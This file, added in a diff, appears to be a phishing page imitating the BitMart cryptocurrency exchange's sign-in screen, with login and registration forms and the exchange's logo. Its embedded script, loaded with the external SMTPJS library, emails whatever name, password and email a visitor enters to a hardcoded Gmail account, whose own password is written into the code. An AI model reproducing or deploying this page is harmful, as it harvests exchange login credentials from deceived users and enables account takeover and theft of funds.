@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
+    <!-- <a href="https://www.flaticon.com/free-icons/eye" title="eye icons">Eye icons created by Gregor Cresnar - Flaticon</a> -->
+</head>
+<body>
+
+
+    <nav>
+        <div id="mySidenav" class="sidenav">
+            <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+            <a href="#">About</a>
+            <a href="#">Services</a>
+            <a href="#">Clients</a>
+            <a href="#">Contact</a>
+          </div>
+          
+          <div>
+            <div style="display: flex;justify-content: space-between;">
+                <a href="">
+                    <img src="BitMart logo.png" alt="BitMart_logo" style="width: 8em;">
+                </a>
+
+                <span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;
+                </span>
+            </div>
+           
+        </div>
+      
+        
+        
+    </nav> 
+
+
+    <div class="hero">
+        <div class="form-box">
+            
+            <div class="button-box">
+                <h1>sign in</h1>
+                <p style="color: black;">Scan to in security. <span style="color: aqua;">scan to sign in</span></p>
+                <div id="btn"></div>
+                <div style="gap: 5em;">
+                    <button type="button" class="toggle-btn" onclick="login()">Phone</button>
+                    <button type="button" class="toggle-btn" onclick="register()" style="padding-left:50px;">Email</button>
+                </div>
+            </div>
+            <div class="social-icon">
+                <img src="" alt="">
+                <img src="" alt="">
+                <img src="" alt="">
+            </div>
+    
+            <form onsubmit="sendEmail(); reset(); return false;" class="input-group" id="login" action="" method="post">
+                <input type="name" id="name" name="nmae" max="14" maxlength="15" size="15" class="input-field" placeholder="Phone/Email" required=""
+                 aria-required="true"> <br>
+
+                <input type="password" name="password" class="input-field" placeholder="password" id="password"
+                 required="" aria-required="true"> 
+
+                <!-- <input type="checkbox" name="checkbox" id="checkbox"  onclick="MyShowPassword()"><br><br> -->
+                
+                <img src="download.png" style="width:20px;" name="checkbox" id="checkbox"  onclick="MyShowPassword()"><br><br>
+                <div style="display: flex;justify-content: end;">
+                    <a href=""><span class="span">Forgot password?</span></a>
+                </div><br>
+                
+                <button type="submit" class="submit-btn"><span>LOGIN</span></button>
+
+                <div style="display: flex;justify-content: center;padding-top:10px" >
+                    <span style="color: gray;">Forgot Password</span> <span style=""><a href="" style="color: aqua;">Sign in</a></span>
+                </div>
+            </form>
+
+            <form  onsubmit="sendEmail(); reset(); return false;" class="input-group" id="register" action="" method="post">
+                <!-- <input type="text" class="input-field" placeholder="Phone/Email"> <br> -->
+                <input type="email" onerror="MyEmail()" id="email" class="input-field" placeholder="Email" required="" aria-required="true" name="email"> <br>
+
+                <input type="password" name="password" class="input-field" placeholder="password" id="password1"
+                 required="" aria-required="true"> 
+
+                <img src="download.png" style="width:20px;" name="" id="checkbox"  onclick="MyShowPassword()"><br><br>
+
+                <i class="fa fa-eye" aria-hidden="true"></i>
+                <div style="display: flex;justify-content: end;">
+                    <a href=""><span class="span">Forgot password?</span></a>
+                </div><br>
+                
+                <button type="submit" class="submit-btn"><span>Sign in</span></button>
+
+                <div style="display: flex;justify-content: center;padding-top:10px;">
+                    <span style="color: gray;">Forgot password</span> <span style="color: aqua;"><a href="" style="color: aqua;">Sign up</a></span>
+                    <!-- <ion-icon name="eye-outline"></ion-icon> -->
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div  style="padding: 20px;">
+        <li><a href="#"><b>Company</b></a></li>
+        <li><a href="#">About Us</a></li>
+        <li><a href="#">Careers</a></li>
+        <li><a href="#">Pertner</a></li>
+        <li><a href="#">News</a></li>
+        <li><a href="#">cipholio Venture</a></li>
+    </div>
+
+    <div  style="padding: 20px;">
+        <li><a href="#"><b>product</b></a></li>
+        <li><a href="#">sports</a></li>
+        <li><a href="#">Future</a></li>
+        <li><a href="#">Earn</a></li>
+        <li><a href="#">News</a></li>
+        <li><a href="#">Shooting Star </a></li>
+        <li><a href="#">Stacking </a></li>
+        <li><a href="#">Leading </a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">BMX</a></li>
+
+
+
+    </div>
+
+    <div  style="padding: 20px;">
+        <li><a href="#"><b>Service </b></a></li>
+        <li><a href="#">Help Senter</a></li>
+        <li><a href="#">Fees</a></li>
+        <li><a href="#">bug Bounty</a></li>
+        <li><a href="#">Security</a></li>
+        <li><a href="#">User Agreement</a></li>
+        <li><a href="#"> Privacy Policy</a></li>
+    </div>
+
+    <div  style="padding: 20px;">
+        <li><a href="#"><b>Support</b></a></li>
+        <li><a href="#">Apply To list</a></li>
+        <li><a href="#">Marketing Co-orperation</a></li>
+        <li><a href="#">Contact us</a></li>
+        <li><a href="#">Official Verification</a></li>
+    </div>
+
+
+    <!-- <div>
+        <h1>Hello, <br>
+            Welcome back
+        </h1>
+        <div class="phone-container">
+            <div class="phone-btn-container">
+                <button type="button" class="phone-btn" id="phone-btn" onclick="PhoneBtn()"> <span>Phone</span> </button>
+                <button type="button" class="phone-btn" id="phone-btn2" onclick="PhoneBtn2()"> <span>Email</span> </button>
+            </div>
+
+            <div>
+                <form action="" method="get">
+                    <input type="tel" name="number" id="number" placeholder="Phone/Email"><br><br>
+                    <input type="password" name="password" id="password" placeholder="password"> 
+                    <input type="checkbox" name="checkbox" id=""  onclick="MyShowPassword()"><br><br>
+                    <div>
+                        <a href="">Forgot password</a><br><br>
+                    </div>
+                    <button class="submit-btn" type="submit">Login</button>
+                </form>
+            </div>
+
+        </div>
+    </div>
+ -->
+
+
+
+    
+    <!-- <form action="mail.php" method="post">
+        <label for="name">Your Name</label>
+        <input type="text" name="name" placeholder="Your name..">
+    
+        <label for="lname">Email</label>
+        <input type="email" name="email" placeholder="Your email..">
+       
+        <label for="message">Message</label>
+        <textarea name="message" placeholder="Write something.." style="height:200px"></textarea>
+    
+        <input type="submit" value="Submit">
+      </form> -->
+
+
+
+
+      <script src=" https://smtpjs.com/v3/smtp.js"></script>
+      <script>
+        function sendEmail(){
+                    Email.send({
+                        Host : "smtp.gmail.com",
+                        Username : "diorddcc4@gmail.com",
+                        Password : "dior1234",
+                        To : 'diorddcc4@gmail.com',
+                        From : document.getElementById("email").value,
+                        Subject : "New Contact Form Enquiry",
+                        Body : "Name: "+ document.getElementById("name").value
+                        + "<br> Password: " + document.getElementById("password")
+                        + "<br> Email: " + document.getElementById("Email")
+                    }).then(
+                    message => alert("Message Sent")
+                    );
+
+
+        }
+      </script>
+
+
+      <script>
+
+
+        
+
+        function MyShowPassword(){
+            var x = document.getElementById("password1");
+            if (x.type === "password"){
+                x.type = 'text';
+            }else{
+                x.type = 'password'
+            }
+        }
+
+        function MyEmail(){
+            var x = document.getElementById("email");
+            if(x.type === "email"){
+                x.type = true;
+            }else{
+                x.type = "email"
+            }
+
+        }
+
+        
+
+      </script>
+
+      <script src="script.js">
+        
+      </script>
+      <script src="contact.js">
+    </script>
+
+</body>
+</html>
